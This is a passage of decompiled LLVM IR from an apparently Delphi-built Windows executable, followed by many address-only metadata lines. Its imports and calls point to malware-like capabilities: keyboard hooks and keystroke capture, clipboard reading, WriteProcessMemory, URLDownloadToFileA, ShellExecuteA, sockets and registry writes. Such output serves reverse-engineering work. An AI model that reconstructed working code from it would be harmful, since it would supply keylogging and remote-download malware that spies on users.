  %11 = trunc i32 %10 to i8, !insn.addr !2151
  %12 = icmp eq i8 %11, 0, !insn.addr !2151
  br i1 %12, label %dec_label_pc_407cbc, label %dec_label_pc_407c41, !insn.addr !2152

dec_label_pc_407c41:                              ; preds = %dec_label_pc_407bb8
  %13 = load i32, i32* @global_var_408130, align 4, !insn.addr !2153
  %14 = inttoptr i32 %13 to i32*, !insn.addr !2154
  store i32 -1, i32* %14, align 4, !insn.addr !2154
  %15 = call i32 @"@LStrFromArray"(), !insn.addr !2155
  %16 = call i32 @function_40707c(), !insn.addr !2156
  %17 = call i32 @"@LStrAsg"(), !insn.addr !2157
  %18 = call i32 @"@LStrCat3"(), !insn.addr !2158
  %19 = call i32 @function_4036c8(), !insn.addr !2159
  %20 = inttoptr i32 %19 to i8*, !insn.addr !2160
  %21 = call i1 @DeleteFileA(i8* %20), !insn.addr !2161
  %22 = call i32 @"@LStrCat3"(), !insn.addr !2162
  %23 = call i32 @function_4036c8(), !insn.addr !2163
  %24 = inttoptr i32 %23 to i8*, !insn.addr !2164
  store i8* %24, i8** %stack_var_-132, align 4, !insn.addr !2164
  %25 = ptrtoint i8** %stack_var_-132 to i32, !insn.addr !2164
  %26 = call i32* @LoadLibraryA(i8* %24), !insn.addr !2165
  %27 = ptrtoint i32* %26 to i32, !insn.addr !2165
  store i32 %27, i32* @global_var_40811c, align 4, !insn.addr !2166
  store i32 %25, i32* %esp.0.reg2mem, !insn.addr !2167
  br label %dec_label_pc_407cde, !insn.addr !2167

dec_label_pc_407cbc:                              ; preds = %dec_label_pc_407bb8
  %28 = ptrtoint i32* %stack_var_-124 to i32, !insn.addr !2144
  %29 = call i32 @function_4070b4(), !insn.addr !2168
  %30 = trunc i32 %29 to i8, !insn.addr !2169
  %31 = icmp eq i8 %30, 0, !insn.addr !2169
  store i32 %28, i32* %esp.2.reg2mem, !insn.addr !2170
  br i1 %31, label %dec_label_pc_407e20, label %dec_label_pc_407cd3, !insn.addr !2170

dec_label_pc_407cd3:                              ; preds = %dec_label_pc_407cbc
  %32 = load i32*, i32** @global_var_40813c, align 4, !insn.addr !2171
  store i32 -1, i32* %32, align 4, !insn.addr !2172
  store i32 %28, i32* %esp.0.reg2mem, !insn.addr !2172
  br label %dec_label_pc_407cde, !insn.addr !2172

dec_label_pc_407cde:                              ; preds = %dec_label_pc_407cd3, %dec_label_pc_407c41
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %33 = add i32 %esp.0.reload, -4, !insn.addr !2173
  %34 = inttoptr i32 %33 to i32*, !insn.addr !2173
  store i32 260, i32* %34, align 4, !insn.addr !2173
  %35 = add i32 %esp.0.reload, -8, !insn.addr !2174
  %36 = inttoptr i32 %35 to i32*, !insn.addr !2174
  store i32 ptrtoint (i8** @global_var_4096fc to i32), i32* %36, align 4, !insn.addr !2174
  %37 = load i32 (i32, i32, i32)*, i32 (i32, i32, i32)** @global_var_409650, align 4, !insn.addr !2175
  %38 = ptrtoint i32 (i32, i32, i32)* %37 to i32, !insn.addr !2175
  %39 = add i32 %esp.0.reload, -12, !insn.addr !2176
  %40 = inttoptr i32 %39 to i32*, !insn.addr !2176
  store i32 %38, i32* %40, align 4, !insn.addr !2176
  %41 = call i32 @GetModuleFileNameA(i32* nonnull @0, i8* bitcast (i32* @0 to i8*), i32 ptrtoint (i32* @0 to i32)), !insn.addr !2177
  %42 = add i32 %41, ptrtoint (i8** @global_var_4096fc to i32), !insn.addr !2178
  %43 = inttoptr i32 %42 to i8*, !insn.addr !2178
  store i8 0, i8* %43, align 1, !insn.addr !2178
  %44 = call i32 @"@LStrFromArray"(), !insn.addr !2179
  %45 = call i32 @function_40707c(), !insn.addr !2180
  %46 = call i32 @"@LStrAsg"(), !insn.addr !2181
  %47 = call i32 @"@LStrCat3"(), !insn.addr !2182
  %48 = load i32*, i32** @global_var_40813c, align 4, !insn.addr !2183
  %49 = icmp eq i32* %48, null, !insn.addr !2183
  br i1 %49, label %dec_label_pc_407d77, label %dec_label_pc_407d44, !insn.addr !2184

dec_label_pc_407d44:                              ; preds = %dec_label_pc_407cde
  %50 = add i32 %esp.0.reload, -16, !insn.addr !2185
  %51 = inttoptr i32 %50 to i32*, !insn.addr !2185
  store i32 ptrtoint ([16 x i8]* @global_var_407ea0 to i32), i32* %51, align 4, !insn.addr !2185
  %52 = add i32 %esp.0.reload, -20, !insn.addr !2186
  %53 = inttoptr i32 %52 to i32*, !insn.addr !2186
  store i32 ptrtoint ([8 x i8]* @global_var_407eb0 to i32), i32* %53, align 4, !insn.addr !2186
  %54 = call i32* @FindWindowA(i8* bitcast (i32* @0 to i8*), i8* bitcast (i32* @0 to i8*)), !insn.addr !2187
  %55 = icmp eq i32* %54, null, !insn.addr !2188
  %56 = icmp eq i1 %55, false, !insn.addr !2189
  store i32 %52, i32* %esp.2.reg2mem, !insn.addr !2189
  br i1 %56, label %dec_label_pc_407e20, label %dec_label_pc_407d5b, !insn.addr !2189

dec_label_pc_407d5b:                              ; preds = %dec_label_pc_407d44
  %57 = add i32 %esp.0.reload, -24, !insn.addr !2190
  %58 = inttoptr i32 %57 to i32*, !insn.addr !2190
  store i32 ptrtoint (i32* @global_var_40980c to i32), i32* %58, align 4, !insn.addr !2190
  %59 = add i32 %esp.0.reload, -28, !insn.addr !2191
  %60 = inttoptr i32 %59 to i32*, !insn.addr !2191
  store i32 0, i32* %60, align 4, !insn.addr !2191
  %61 = add i32 %esp.0.reload, -32, !insn.addr !2192
  %62 = inttoptr i32 %61 to i32*, !insn.addr !2192
  store i32 66, i32* %62, align 4, !insn.addr !2192
  %63 = add i32 %esp.0.reload, -36, !insn.addr !2193
  %64 = inttoptr i32 %63 to i32*, !insn.addr !2193
  store i32 4220064, i32* %64, align 4, !insn.addr !2193
  %65 = add i32 %esp.0.reload, -40, !insn.addr !2194
  %66 = inttoptr i32 %65 to i32*, !insn.addr !2194
  store i32 0, i32* %66, align 4, !insn.addr !2194
  %67 = add i32 %esp.0.reload, -44, !insn.addr !2195
  %68 = inttoptr i32 %67 to i32*, !insn.addr !2195
  store i32 0, i32* %68, align 4, !insn.addr !2195
  %69 = call i32* @CreateThread(%_SECURITY_ATTRIBUTES* bitcast (i32* @0 to %_SECURITY_ATTRIBUTES*), i32 ptrtoint (i32* @0 to i32), i32 (i32*)* bitcast (i32* @0 to i32 (i32*)*), i32* nonnull @0, i32 ptrtoint (i32* @0 to i32), i32* nonnull @0), !insn.addr !2196
  store i32 %67, i32* %esp.2.reg2mem, !insn.addr !2197
  br label %dec_label_pc_407e20, !insn.addr !2197

dec_label_pc_407d77:                              ; preds = %dec_label_pc_407cde
  %70 = load i32, i32* @global_var_408130, align 4, !insn.addr !2198
  %71 = icmp eq i32 %70, 0, !insn.addr !2198
  store i32 %39, i32* %esp.2.reg2mem, !insn.addr !2199
  br i1 %71, label %dec_label_pc_407e20, label %dec_label_pc_407d85, !insn.addr !2199

dec_label_pc_407d85:                              ; preds = %dec_label_pc_407d77
  %72 = load i8, i8* bitcast (i32** @global_var_408168 to i8*), align 4, !insn.addr !2200
  %73 = icmp eq i8 %72, 0, !insn.addr !2200
  br i1 %73, label %dec_label_pc_407d94, label %dec_label_pc_407d8f, !insn.addr !2201

dec_label_pc_407d8f:                              ; preds = %dec_label_pc_407d85
  %74 = call i32 @function_4068dc(), !insn.addr !2202
  br label %dec_label_pc_407d94, !insn.addr !2202

dec_label_pc_407d94:                              ; preds = %dec_label_pc_407d8f, %dec_label_pc_407d85
  %75 = load i32, i32* @global_var_40814c, align 4, !insn.addr !2203
  %76 = icmp slt i32 %75, 1, !insn.addr !2204
  br i1 %76, label %dec_label_pc_407dd1, label %dec_label_pc_407d9e, !insn.addr !2204

dec_label_pc_407d9e:                              ; preds = %dec_label_pc_407d94
  %77 = call i32 @function_40660c(), !insn.addr !2205
  %78 = call i32 @"@LStrCmp"(), !insn.addr !2206
  %79 = load i32*, i32** @global_var_408158, align 4, !insn.addr !2207
  store i32 -1, i32* %79, align 4, !insn.addr !2208
  %80 = load i32*, i32** @global_var_408158, align 4, !insn.addr !2209
  %81 = icmp eq i32* %80, null, !insn.addr !2209
  br i1 %81, label %dec_label_pc_407dd1, label %dec_label_pc_407dcc, !insn.addr !2210

dec_label_pc_407dcc:                              ; preds = %dec_label_pc_407d9e
  %82 = call i32 @function_4063c4(), !insn.addr !2211
  br label %dec_label_pc_407dd1, !insn.addr !2211

dec_label_pc_407dd1:                              ; preds = %dec_label_pc_407dcc, %dec_label_pc_407d9e, %dec_label_pc_407d94
  %83 = add i32 %esp.0.reload, -16, !insn.addr !2212
  %84 = inttoptr i32 %83 to i32*, !insn.addr !2212
  store i32 3, i32* %84, align 4, !insn.addr !2212
  %85 = add i32 %esp.0.reload, -20, !insn.addr !2213
  %86 = inttoptr i32 %85 to i32*, !insn.addr !2213
  store i32 16065, i32* %86, align 4, !insn.addr !2213
  %87 = load i32, i32* @global_var_40811c, align 4, !insn.addr !2214
  %88 = add i32 %esp.0.reload, -24, !insn.addr !2215
  %89 = inttoptr i32 %88 to i32*, !insn.addr !2215
  store i32 %87, i32* %89, align 4, !insn.addr !2215
  %90 = call i32* @FindResourceA(i32* nonnull @0, i8* bitcast (i32* @0 to i8*), i8* bitcast (i32* @0 to i8*)), !insn.addr !2216
  %91 = icmp eq i32* %90, null, !insn.addr !2217
  %92 = icmp eq i1 %91, false, !insn.addr !2218
  store i32 %88, i32* %esp.1.reg2mem, !insn.addr !2218
  br i1 %92, label %dec_label_pc_407e11, label %dec_label_pc_407de7, !insn.addr !2218

dec_label_pc_407de7:                              ; preds = %dec_label_pc_407dd1
  %93 = add i32 %esp.0.reload, -28, !insn.addr !2219
  %94 = inttoptr i32 %93 to i32*, !insn.addr !2219
  store i32 14, i32* %94, align 4, !insn.addr !2219
  %95 = add i32 %esp.0.reload, -32, !insn.addr !2220
  %96 = inttoptr i32 %95 to i32*, !insn.addr !2220
  store i32 16065, i32* %96, align 4, !insn.addr !2220
  %97 = load i32, i32* @global_var_40811c, align 4, !insn.addr !2221
  %98 = add i32 %esp.0.reload, -36, !insn.addr !2222
  %99 = inttoptr i32 %98 to i32*, !insn.addr !2222
  store i32 %97, i32* %99, align 4, !insn.addr !2222
  %100 = call i32* @FindResourceA(i32* nonnull @0, i8* bitcast (i32* @0 to i8*), i8* bitcast (i32* @0 to i8*)), !insn.addr !2223
  %101 = icmp eq i32* %100, null, !insn.addr !2224
  %102 = icmp eq i1 %101, false, !insn.addr !2225
  store i32 %98, i32* %esp.1.reg2mem, !insn.addr !2225
  br i1 %102, label %dec_label_pc_407e11, label %dec_label_pc_407dfd, !insn.addr !2225

dec_label_pc_407dfd:                              ; preds = %dec_label_pc_407de7
  %103 = add i32 %esp.0.reload, -40, !insn.addr !2226
  %104 = inttoptr i32 %103 to i32*, !insn.addr !2226
  store i32 16065, i32* %104, align 4, !insn.addr !2226
  %105 = load i32, i32* @global_var_40811c, align 4, !insn.addr !2227
  %106 = add i32 %esp.0.reload, -44, !insn.addr !2228
  %107 = inttoptr i32 %106 to i32*, !insn.addr !2228
  store i32 %105, i32* %107, align 4, !insn.addr !2228
  %108 = call i32* @LoadIconA(i32* nonnull @0, i8* bitcast (i32* @0 to i8*)), !insn.addr !2229
  %109 = icmp eq i32* %108, null, !insn.addr !2230
  store i32 %106, i32* %esp.1.reg2mem, !insn.addr !2231
  store i32 %106, i32* %esp.2.reg2mem, !insn.addr !2231
  br i1 %109, label %dec_label_pc_407e20, label %dec_label_pc_407e11, !insn.addr !2231

dec_label_pc_407e11:                              ; preds = %dec_label_pc_407dfd, %dec_label_pc_407de7, %dec_label_pc_407dd1
  %esp.1.reload = load i32, i32* %esp.1.reg2mem
  %110 = call i32 @function_407950(), !insn.addr !2232
  store i32 4225668, i32* @global_var_409654, align 4, !insn.addr !2233
  store i32 %esp.1.reload, i32* %esp.2.reg2mem, !insn.addr !2233
  br label %dec_label_pc_407e20, !insn.addr !2233

dec_label_pc_407e20:                              ; preds = %dec_label_pc_407e11, %dec_label_pc_407dfd, %dec_label_pc_407d77, %dec_label_pc_407d5b, %dec_label_pc_407d44, %dec_label_pc_407cbc
  %esp.2.reload = load i32, i32* %esp.2.reg2mem
  %111 = inttoptr i32 %esp.2.reload to i32*, !insn.addr !2234
  %112 = load i32, i32* %111, align 4, !insn.addr !2234
  call void @__writefsdword(i32 0, i32 %112), !insn.addr !2235
  %113 = add i32 %esp.2.reload, 8, !insn.addr !2236
  %114 = inttoptr i32 %113 to i32*, !insn.addr !2236
  store i32 4226626, i32* %114, align 4, !insn.addr !2236
  %115 = call i32 @"@LStrArrayClr"(), !insn.addr !2237
  ret i32 %115, !insn.addr !2238
}

define i32 @function_407e3b() local_unnamed_addr {
dec_label_pc_407e3b:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !2239
  ret i32 %0, !insn.addr !2239
}

define i32 @function_407e40() local_unnamed_addr {
dec_label_pc_407e40:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !2240
}

declare void @DeleteCriticalSection(%_RTL_CRITICAL_SECTION*) local_unnamed_addr

declare void @LeaveCriticalSection(%_RTL_CRITICAL_SECTION*) local_unnamed_addr

declare void @EnterCriticalSection(%_RTL_CRITICAL_SECTION*) local_unnamed_addr

declare void @InitializeCriticalSection(%_RTL_CRITICAL_SECTION*) local_unnamed_addr

declare i1 @VirtualFree(i32*, i32, i32) local_unnamed_addr

declare i32* @VirtualAlloc(i32*, i32, i32, i32) local_unnamed_addr

declare i32* @LocalFree(i32*) local_unnamed_addr

declare i32* @LocalAlloc(i32, i32) local_unnamed_addr

declare i32 @GetTickCount() local_unnamed_addr

declare i1 @QueryPerformanceCounter(%_LARGE_INTEGER*) local_unnamed_addr

declare i32 @GetVersion() local_unnamed_addr

declare i32 @GetCurrentThreadId() local_unnamed_addr

declare i32 @GetThreadLocale() local_unnamed_addr

declare void @GetStartupInfoA(%_STARTUPINFOA*) local_unnamed_addr

declare i32 @GetLocaleInfoA(i32, i32, i8*, i32) local_unnamed_addr

declare i8* @GetCommandLineA() local_unnamed_addr

declare i1 @FreeLibrary(i32*) local_unnamed_addr

declare void @ExitProcess(i32) local_unnamed_addr

declare i1 @WriteFile(i32*, i32*, i32, i32*, %_OVERLAPPED*) local_unnamed_addr

declare i32 @UnhandledExceptionFilter(%_EXCEPTION_POINTERS*) local_unnamed_addr

declare void @RtlUnwind(i32*, i32*, %_EXCEPTION_RECORD*, i32*) local_unnamed_addr

declare void @RaiseException(i32, i32, i32, i32*) local_unnamed_addr

declare i32* @GetStdHandle(i32) local_unnamed_addr

declare i32 @GetKeyboardType(i32) local_unnamed_addr

declare i32 @MessageBoxA(i32*, i8*, i8*, i32) local_unnamed_addr

declare i32 @RegQueryValueExA(i32*, i8*, i32*, i32*, i8*, i32*) local_unnamed_addr

declare i32 @RegOpenKeyExA(i32*, i8*, i32, i32, i32**) local_unnamed_addr

declare i32 @RegCloseKey(i32*) local_unnamed_addr

declare void @SysFreeString(i16*) local_unnamed_addr

declare i32 @SysReAllocStringLen(i16**, i16*, i32) local_unnamed_addr

declare i1 @TlsSetValue(i32, i32*) local_unnamed_addr

declare i32* @TlsGetValue(i32) local_unnamed_addr

declare i1 @TlsFree(i32) local_unnamed_addr

declare i32 @TlsAlloc() local_unnamed_addr

declare i32 @LocalFree.2() local_unnamed_addr

declare i32 @LocalAlloc.3() local_unnamed_addr

declare i32 @RegSetValueExA(i32*, i8*, i32, i32, i8*, i32) local_unnamed_addr

declare i32 @RegQueryValueExA.4() local_unnamed_addr

declare i32 @RegOpenKeyExA.5() local_unnamed_addr

declare i32 @RegDeleteKeyA(i32*, i8*) local_unnamed_addr

declare i32 @RegCreateKeyExA(i32*, i8*, i32, i8*, i32, i32, %_SECURITY_ATTRIBUTES*, i32**, i32*) local_unnamed_addr

declare i32 @RegCloseKey.6() local_unnamed_addr

declare i8* @lstrcpyA(i8*, i8*) local_unnamed_addr

declare i32 @lstrcmpiA(i8*, i8*) local_unnamed_addr

declare i1 @WriteProcessMemory(i32*, i32*, i32*, i32, i32*) local_unnamed_addr

declare i32 @WriteFile.7() local_unnamed_addr

declare i1 @VirtualProtect(i32*, i32, i32, i32*) local_unnamed_addr

declare void @Sleep(i32) local_unnamed_addr

declare i1 @SetEndOfFile(i32*) local_unnamed_addr

declare i1 @ReadFile(i32*, i32*, i32, i32*, %_OVERLAPPED*) local_unnamed_addr

declare i32* @LoadLibraryA(i8*) local_unnamed_addr

declare i1 @GlobalUnlock(i32*) local_unnamed_addr

declare i32* @GlobalLock(i32*) local_unnamed_addr

declare i32* @GlobalFree(i32*) local_unnamed_addr

declare i32* @GlobalAlloc(i32, i32) local_unnamed_addr

declare i32 @GetTickCount.8() local_unnamed_addr

declare i32 @GetTempPathA(i32, i8*) local_unnamed_addr

declare i32 ()* @GetProcAddress(i32*, i8*) local_unnamed_addr

declare i32* @GetModuleHandleA(i8*) local_unnamed_addr

declare i32 @GetModuleFileNameA(i32*, i8*, i32) local_unnamed_addr

declare i32 @GetFileSize(i32*, i32*) local_unnamed_addr

declare i32* @GetCurrentProcess() local_unnamed_addr

declare void @FreeLibraryAndExitThread(i32*, i32) local_unnamed_addr

declare i32* @FindResourceA(i32*, i8*, i8*) local_unnamed_addr

declare i32 @ExitProcess.9() local_unnamed_addr

declare i1 @DeleteFileA(i8*) local_unnamed_addr

declare i32* @CreateThread(%_SECURITY_ATTRIBUTES*, i32, i32 (i32*)*, i32*, i32, i32*) local_unnamed_addr

declare i32* @CreateFileA(i8*, i32, i32, %_SECURITY_ATTRIBUTES*, i32, i32, i32*) local_unnamed_addr

declare i1 @CopyFileA(i8*, i8*, i1) local_unnamed_addr

declare i32 @CompareStringA(i32, i32, i8*, i32, i8*, i32) local_unnamed_addr

declare i1 @CloseHandle(i32*) local_unnamed_addr

declare i32* @SelectObject(i32*, i32*) local_unnamed_addr

declare i32* @GetStockObject(i32) local_unnamed_addr

declare i1 @GetCharWidthA(i32*, i32, i32, i32*) local_unnamed_addr

declare i32 @CreateWindowExA.10() local_unnamed_addr

declare i1 @UnhookWindowsHookEx(i32*) local_unnamed_addr

declare i32 @ToAscii(i32, i32, i8*, i16*, i32) local_unnamed_addr

declare i32* @SetWindowsHookExA(i32, i32 (i32, i32, i32)*, i32*, i32) local_unnamed_addr

declare i32 @SetWindowLongA(i32*, i32, i32) local_unnamed_addr

declare i32 @SetTimer(i32*, i32, i32, void (i32*, i32, i32, i32)*) local_unnamed_addr

declare i32 @SendMessageA(i32*, i32, i32, i32) local_unnamed_addr

declare i32 @ReleaseDC(i32*, i32*) local_unnamed_addr

declare void @PostQuitMessage(i32) local_unnamed_addr

declare i1 @PostMessageA(i32*, i32, i32, i32) local_unnamed_addr

declare i1 @OpenClipboard(i32*) local_unnamed_addr

declare i32* @LoadIconA(i32*, i8*) local_unnamed_addr

declare i1 @KillTimer(i32*, i32) local_unnamed_addr

declare i1 @IsWindowVisible(i32*) local_unnamed_addr

declare i1 @IsWindow(i32*) local_unnamed_addr

declare i32 @GetWindowThreadProcessId(i32*, i32*) local_unnamed_addr

declare i32 @GetWindowLongA(i32*, i32) local_unnamed_addr

declare i32* @GetTopWindow(i32*) local_unnamed_addr

declare i32* @GetParent(i32*) local_unnamed_addr

declare i32* @GetWindow(i32*, i32) local_unnamed_addr

declare i1 @GetMessageA(%tagMSG*, i32*, i32, i32) local_unnamed_addr

declare i1 @GetKeyboardState(i8*) local_unnamed_addr

declare i32* @GetDC(i32*) local_unnamed_addr

declare i32* @GetClipboardData(i32) local_unnamed_addr

declare i32 @GetClassNameA(i32*, i8*, i32) local_unnamed_addr

declare i32 @GetClassLongA(i32*, i32) local_unnamed_addr

declare i1 @GetCaretPos(%tagPOINT*) local_unnamed_addr

declare i32* @FindWindowExA(i32*, i32*, i8*, i8*) local_unnamed_addr

declare i32* @FindWindowA(i8*, i8*) local_unnamed_addr

declare i1 @EnumWindows(i1 (i32*, i32)*, i32) local_unnamed_addr

declare i32 @DispatchMessageA(%tagMSG*) local_unnamed_addr

declare i32 @DefWindowProcA(i32*, i32, i32, i32) local_unnamed_addr

declare i1 @CloseClipboard() local_unnamed_addr

declare i32 @CallNextHookEx(i32*, i32, i32, i32) local_unnamed_addr

declare i32 @WSACleanup() local_unnamed_addr

declare i32 @WSAStartup(i16, %WSAData*) local_unnamed_addr

declare i32 @gethostname(i8*, i32) local_unnamed_addr

declare %hostent* @gethostbyname(i8*) local_unnamed_addr

declare i32 @socket(i32, i32, i32) local_unnamed_addr

declare i32 @send(i32, i8*, i32, i32) local_unnamed_addr

declare i32 @recv(i32, i8*, i32, i32) local_unnamed_addr

declare i8* @inet_ntoa(%in_addr) local_unnamed_addr

declare i16 @htons(i16) local_unnamed_addr

declare i32 @connect(i32, %sockaddr*, i32) local_unnamed_addr

declare i32 @closesocket(i32) local_unnamed_addr

declare i32* @ShellExecuteA(i32*, i8*, i8*, i8*, i8*, i32) local_unnamed_addr

declare i32 @URLDownloadToFileA(i32*, i8*, i8*, i32, i32*) local_unnamed_addr

declare i32 @URLDownloadToFileA.11() local_unnamed_addr

declare i1 @PathFileExistsA(i8*) local_unnamed_addr

declare i32* @ImageDirectoryEntryToData(i32*, i8, i16, i32*) local_unnamed_addr

; Function Attrs: nounwind readnone speculatable
declare i8 @llvm.ctpop.i8(i8) #0

declare i8 @__asm_in(i16) local_unnamed_addr

declare i32 @__asm_bound(i64) local_unnamed_addr

declare void @__asm_outsd(i16, i32) local_unnamed_addr

declare void @__asm_arpl(i16, i16) local_unnamed_addr

declare void @__asm_outsb(i16, i8) local_unnamed_addr

declare i32 @__asm_insd(i16) local_unnamed_addr

declare i32 @__asm_iretd() local_unnamed_addr

declare i8 @__asm_insb(i16) local_unnamed_addr

declare i32 @__readfsdword(i32) local_unnamed_addr

declare void @__writefsdword(i32, i32) local_unnamed_addr

declare i8 @__readgsbyte(i32) local_unnamed_addr

declare i32 @__decompiler_undefined_function_0() local_unnamed_addr

declare i1 @__decompiler_undefined_function_1() local_unnamed_addr

declare x86_fp80 @__decompiler_undefined_function_8() local_unnamed_addr

attributes #0 = { nounwind readnone speculatable }

!0 = !{i64 4198496}
!1 = !{i64 4198504}
!2 = !{i64 4198512}
!3 = !{i64 4198520}
!4 = !{i64 4198528}
!5 = !{i64 4198536}
!6 = !{i64 4198544}
!7 = !{i64 4198552}
!8 = !{i64 4198560}
!9 = !{i64 4198568}
!10 = !{i64 4198576}
!11 = !{i64 4198584}
!12 = !{i64 4198592}
!13 = !{i64 4198600}
!14 = !{i64 4198608}
!15 = !{i64 4198616}
!16 = !{i64 4198624}
!17 = !{i64 4198632}
!18 = !{i64 4198640}
!19 = !{i64 4198648}
!20 = !{i64 4198656}
!21 = !{i64 4198700}
!22 = !{i64 4198708}
!23 = !{i64 4198716}
!24 = !{i64 4198724}
!25 = !{i64 4198732}
!26 = !{i64 4198740}
!27 = !{i64 4198748}
!28 = !{i64 4198756}
!29 = !{i64 4200622}
!30 = !{i64 4200627}
!31 = !{i64 4200629}
!32 = !{i64 4200635}
!33 = !{i64 4202592}
!34 = !{i64 4202597}
!35 = !{i64 4202599}
!36 = !{i64 4202608}
!37 = !{i64 4203014}
!38 = !{i64 4203019}
!39 = !{i64 4203021}
!40 = !{i64 4203029}
!41 = !{i64 4203685}
!42 = !{i64 4203690}
!43 = !{i64 4203692}
!44 = !{i64 4203700}
!45 = !{i64 4203859}
!46 = !{i64 4203933}
!47 = !{i64 4203947}
!48 = !{i64 4204720}
!49 = !{i64 4205241}
!50 = !{i64 4205244}
!51 = !{i64 4205248}
!52 = !{i64 4205252}
!53 = !{i64 4205294}
!54 = !{i64 4205337}
!55 = !{i64 4205346}
!56 = !{i64 4205349}
!57 = !{i64 4205351}
!58 = !{i64 4205362}
!59 = !{i64 4205367}
!60 = !{i64 4205372}
!61 = !{i64 4205397}
!62 = !{i64 4206143}
!63 = !{i64 4206165}
!64 = !{i64 4206325}
!65 = !{i64 4206951}
!66 = !{i64 4207089}
!67 = !{i64 4207447}
!68 = !{i64 4207453}
!69 = !{i64 4207458}
!70 = !{i64 4207471}
!71 = !{i64 4207776}
!72 = !{i64 4207790}
!73 = !{i64 4207815}
!74 = !{i64 4207816}
!75 = !{i64 4207818}
!76 = !{i64 4207820}
!77 = !{i64 4207823}
!78 = !{i64 4208007}
!79 = !{i64 4208145}
!80 = !{i64 4208312}
!81 = !{i64 4208314}
!82 = !{i64 4208316}
!83 = !{i64 4208319}
!84 = !{i64 4208320}
!85 = !{i64 4208322}
!86 = !{i64 4208326}
!87 = !{i64 4208328}
!88 = !{i64 4208332}
!89 = !{i64 4208408}
!90 = !{i64 4208413}
!91 = !{i64 4208416}
!92 = !{i64 4208421}
!93 = !{i64 4208487}
!94 = !{i64 4208831}
!95 = !{i64 4209003}
!96 = !{i64 4209263}
!97 = !{i64 4209790}
!98 = !{i64 4209799}
!99 = !{i64 4209800}
!100 = !{i64 4209802}
!101 = !{i64 4209804}
!102 = !{i64 4209807}
!103 = !{i64 4209808}
!104 = !{i64 4209813}
!105 = !{i64 4209814}
!106 = !{i64 4209832}
!107 = !{i64 4209837}
!108 = !{i64 4209840}
!109 = !{i64 4209845}
!110 = !{i64 4210564}
!111 = !{i64 4210569}
!112 = !{i64 4210573}
!113 = !{i64 4210746}
!114 = !{i64 4210751}
!115 = !{i64 4210759}
!116 = !{i64 4210834}
!117 = !{i64 4210839}
!118 = !{i64 4210842}
!119 = !{i64 4211056}
!120 = !{i64 4211064}
!121 = !{i64 4211072}
!122 = !{i64 4211080}
!123 = !{i64 4211088}
!124 = !{i64 4211096}
!125 = !{i64 4211121}
!126 = !{i64 4211381}
!127 = !{i64 4211386}
!128 = !{i64 4211471}
!129 = !{i64 4211474}
!130 = !{i64 4211477}
!131 = !{i64 4211485}
!132 = !{i64 4211488}
!133 = !{i64 4211496}
!134 = !{i64 4211497}
!135 = !{i64 4211502}
!136 = !{i64 4211505}
!137 = !{i64 4211508}
!138 = !{i64 4211515}
!139 = !{i64 4211527}
!140 = !{i64 4211530}
!141 = !{i64 4211533}
!142 = !{i64 4211541}
!143 = !{i64 4211544}
!144 = !{i64 4211552}
!145 = !{i64 4211553}
!146 = !{i64 4211558}
!147 = !{i64 4211561}
!148 = !{i64 4211564}
!149 = !{i64 4211571}
!150 = !{i64 4211572}
!151 = !{i64 4211580}
!152 = !{i64 4211588}
!153 = !{i64 4211596}
!154 = !{i64 4211604}
!155 = !{i64 4211612}
!156 = !{i64 4211620}
!157 = !{i64 4211628}
!158 = !{i64 4211636}
!159 = !{i64 4211644}
!160 = !{i64 4211652}
!161 = !{i64 4211660}
!162 = !{i64 4211668}
!163 = !{i64 4211676}
!164 = !{i64 4211684}
!165 = !{i64 4211692}
!166 = !{i64 4211700}
!167 = !{i64 4211708}
!168 = !{i64 4211716}
!169 = !{i64 4211724}
!170 = !{i64 4211732}
!171 = !{i64 4211740}
!172 = !{i64 4211748}
!173 = !{i64 4211756}
!174 = !{i64 4211764}
!175 = !{i64 4211772}
!176 = !{i64 4211780}
!177 = !{i64 4211788}
!178 = !{i64 4211796}
!179 = !{i64 4211804}
!180 = !{i64 4211812}
!181 = !{i64 4211820}
!182 = !{i64 4211828}
!183 = !{i64 4211836}
!184 = !{i64 4211844}
!185 = !{i64 4211852}
!186 = !{i64 4211860}
!187 = !{i64 4211868}
!188 = !{i64 4211876}
!189 = !{i64 4211884}
!190 = !{i64 4211892}
!191 = !{i64 4211900}
!192 = !{i64 4211908}
!193 = !{i64 4211916}
!194 = !{i64 4211924}
!195 = !{i64 4211932}
!196 = !{i64 4211940}
!197 = !{i64 4211948}
!198 = !{i64 4211956}
!199 = !{i64 4211964}
!200 = !{i64 4211972}
!201 = !{i64 4211980}
!202 = !{i64 4211988}
!203 = !{i64 4211996}
!204 = !{i64 4212004}
!205 = !{i64 4212012}
!206 = !{i64 4212020}
!207 = !{i64 4212028}
!208 = !{i64 4212036}
!209 = !{i64 4212044}
!210 = !{i64 4212052}
!211 = !{i64 4212060}
!212 = !{i64 4212068}
!213 = !{i64 4212076}
!214 = !{i64 4212084}
!215 = !{i64 4212092}
!216 = !{i64 4212100}
!217 = !{i64 4212108}
!218 = !{i64 4212116}
!219 = !{i64 4212124}
!220 = !{i64 4212132}
!221 = !{i64 4212141}
!222 = !{i64 4212146}
!223 = !{i64 4212148}
!224 = !{i64 4212255}
!225 = !{i64 4212258}
!226 = !{i64 4212261}
!227 = !{i64 4212269}
!228 = !{i64 4212272}
!229 = !{i64 4212280}
!230 = !{i64 4212281}
!231 = !{i64 4212286}
!232 = !{i64 4212289}
!233 = !{i64 4212292}
!234 = !{i64 4212299}
!235 = !{i64 4212303}
!236 = !{i64 4212305}
!237 = !{i64 4212307}
!238 = !{i64 4212312}
!239 = !{i64 4212319}
!240 = !{i64 4212321}
!241 = !{i64 4212323}
!242 = !{i64 4212325}
!243 = !{i64 4212327}
!244 = !{i64 4212330}
!245 = !{i64 4212334}
!246 = !{i64 4212339}
!247 = !{i64 4212342}
!248 = !{i64 4212345}
!249 = !{i64 4212351}
!250 = !{i64 4212358}
!251 = !{i64 4212368}
!252 = !{i64 4212378}
!253 = !{i64 4212388}
!254 = !{i64 4212398}
!255 = !{i64 4212333}
!256 = !{i64 4212405}
!257 = !{i64 4212408}
!258 = !{i64 4212411}
!259 = !{i64 4212416}
!260 = !{i64 4212417}
!261 = !{i64 4212422}
!262 = !{i64 4212425}
!263 = !{i64 4212428}
!264 = !{i64 4212435}
!265 = !{i64 4212436}
!266 = !{i64 4212443}
!267 = !{i64 4212454}
!268 = !{i64 4212461}
!269 = !{i64 4212463}
!270 = !{i64 4212469}
!271 = !{i64 4212471}
